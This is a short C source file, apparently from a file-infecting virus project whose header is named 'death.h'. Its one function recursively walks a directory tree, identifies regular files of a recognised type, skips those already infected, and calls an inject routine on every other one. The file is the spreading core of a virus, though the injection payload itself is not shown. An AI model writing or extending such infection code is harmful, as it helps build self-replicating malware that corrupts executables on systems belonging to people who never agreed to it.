#include "death.h"

void scan_dir(char *path)
{
	DIR *dir = opendir(path);
	char fullpath[4096];
	if (!dir)
		return;
	struct dirent *entry;
	while ((entry = readdir(dir)) != NULL)
	{
		if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
			continue;
		snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
		struct stat st;
		if (lstat(fullpath, &st) == -1)
			continue;
		if (S_ISDIR(st.st_mode))
		{
			scan_dir(fullpath);
			continue;
		}
		if (S_ISREG(st.st_mode))
		{
			if (detect_file(fullpath) != FT_UNKNOWN && !ready_infect(fullpath))
				inject(fullpath);
		}
	}
	closedir(dir);
} 

